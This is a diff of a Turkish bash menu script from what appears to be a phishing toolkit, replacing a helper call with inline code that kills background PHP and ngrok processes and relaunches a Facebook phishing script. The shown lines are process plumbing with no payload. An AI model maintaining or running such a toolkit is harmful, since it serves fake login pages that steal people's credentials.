@@ -296,10 +296,31 @@ elif [[ $secim == 2 ]];then
 	echo
 	dongu
 elif [[ $secim == k || $secim == K ]];then
-	bash pidkapat.sh
-	sleep 2
-	bash facebook_phishing.sh
-	exit
+	kontrol=$(ps aux |grep "ngrok" |grep -v grep |grep -v index |awk '{print $2}' |wc -l)
+	if [[ $kontrol == 1 ]];then
+		killall php
+		killall ngrok
+		echo
+		echo
+		echo
+		printf "\e[32m[✓] \e[33mPHP & NGROK\e[97m ARKAPLANDAN KAPATILDI"
+		echo
+		echo
+		echo
+		sleep 2
+		bash facebook_phishing.sh
+	else
+		echo
+		echo
+		echo
+		printf "\e[31m[*] \e[33mPHP & NGROK\e[97m ARKAPLANDA ÇALIŞMIYOR"
+		echo
+		echo
+		echo
+		sleep 2
+		bash facebook_phishing.sh
+		exit
+	fi
 elif [[ $secim == g || $secim == G || $secim == .. ]];then
 	cd ../..
 	bash phishing-attack.sh
